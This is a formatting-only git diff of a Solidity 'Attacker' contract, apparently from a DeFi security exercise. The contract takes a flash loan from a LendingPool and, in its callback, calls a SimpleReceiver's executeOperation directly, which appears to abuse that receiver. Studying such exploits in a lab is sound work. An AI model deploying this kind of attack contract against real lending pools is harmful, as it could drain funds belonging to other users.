@@ -4,7 +4,7 @@ pragma solidity ^0.8.10;
 import "./LendingPool.sol";
 import "./SimpleReceiver.sol";
 
-contract Attacker is IFlashLoanReceiver{
+contract Attacker is IFlashLoanReceiver {
     LendingPool public pool;
     SimpleReceiver public simpleReceiver;
 
@@ -17,12 +17,9 @@ contract Attacker is IFlashLoanReceiver{
         pool.flashLoan(amount, address(this), "0x0");
     }
 
-    function executeOperation(
-        uint256 amounts,
-        address receiverAddress,
-        address _initiator,
-        bytes calldata data
-    ) external {
+    function executeOperation(uint256 amounts, address receiverAddress, address _initiator, bytes calldata data)
+        external
+    {
         simpleReceiver.executeOperation(amounts, receiverAddress, _initiator, data);
     }
 }
